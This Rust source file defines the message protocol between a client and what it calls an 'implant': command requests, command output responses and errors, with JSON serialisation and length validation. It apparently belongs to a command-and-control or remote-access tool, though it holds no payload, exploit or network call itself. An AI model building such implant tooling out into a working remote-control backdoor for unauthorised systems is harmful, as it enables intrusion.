/// Application Message Types
///
/// Defines the application-level message types that are sent as Custom message
/// payloads through the network-protocol secure channel.
use serde::{Deserialize, Serialize};

/// Application-level message types sent over the secure channel
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum AppMessage {
    /// Command execution request from client to implant
    Command {
        /// The command string to execute
        command: String,
    },

    /// Command execution response from implant to client
    Response {
        /// Whether the command executed successfully
        success: bool,
        /// Standard output from the command
        stdout: String,
        /// Standard error from the command
        stderr: String,
        /// Exit code from the command execution
        exit_code: Option<i32>,
    },

    /// Error message for protocol or execution errors
    Error {
        /// Error message description
        message: String,
    },
}

/// Command execution result structure
#[derive(Debug, Clone, PartialEq)]
pub struct CommandResponse {
    /// Whether the command executed successfully
    pub success: bool,
    /// Standard output captured from command
    pub stdout: String,
    /// Standard error captured from command
    pub stderr: String,
    /// Exit code from command execution
    pub exit_code: Option<i32>,
}

impl CommandResponse {
    /// Create a new successful command response
    pub fn success(stdout: String, stderr: String, exit_code: Option<i32>) -> Self {
        Self {
            success: true,
            stdout,
            stderr,
            exit_code,
        }
    }

    /// Create a new failed command response
    pub fn failure(stderr: String, exit_code: Option<i32>) -> Self {
        Self {
            success: false,
            stdout: String::new(),
            stderr,
            exit_code,
        }
    }

    /// Create an error response with a message
    pub fn error(message: String) -> Self {
        Self {
            success: false,
            stdout: String::new(),
            stderr: message,
            exit_code: None,
        }
    }
}

impl std::fmt::Display for CommandResponse {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        if self.success {
            write!(f, "Command executed successfully")?;
            if let Some(code) = self.exit_code {
                write!(f, " (exit code: {})", code)?;
            }
            if !self.stdout.is_empty() {
                write!(f, "\nStdout:\n{}", self.stdout)?;
            }
            if !self.stderr.is_empty() {
                write!(f, "\nStderr:\n{}", self.stderr)?;
            }
        } else {
            write!(f, "Command execution failed")?;
            if let Some(code) = self.exit_code {
                write!(f, " (exit code: {})", code)?;
            }
            if !self.stderr.is_empty() {
                write!(f, "\nError:\n{}", self.stderr)?;
            }
        }
        Ok(())
    }
}

impl AppMessage {
    /// Serialize the message to JSON bytes for transmission
    pub fn to_bytes(&self) -> Result<Vec<u8>, serde_json::Error> {
        serde_json::to_vec(self)
    }

    /// Deserialize message from JSON bytes
    pub fn from_bytes(bytes: &[u8]) -> Result<Self, serde_json::Error> {
        serde_json::from_slice(bytes)
    }

    /// Validate message content (command length, etc.)
    pub fn validate(&self) -> Result<(), String> {
        match self {
            AppMessage::Command { command } => {
                if command.is_empty() {
                    return Err("Command cannot be empty".to_string());
                }
                if command.len() > 1024 {
                    return Err("Command too long (max 1024 characters)".to_string());
                }
                // Additional command validation can be added here
                Ok(())
            }
            AppMessage::Response { .. } => Ok(()),
            AppMessage::Error { message } => {
                if message.is_empty() {
                    return Err("Error message cannot be empty".to_string());
                }
                Ok(())
            }
        }
    }
}
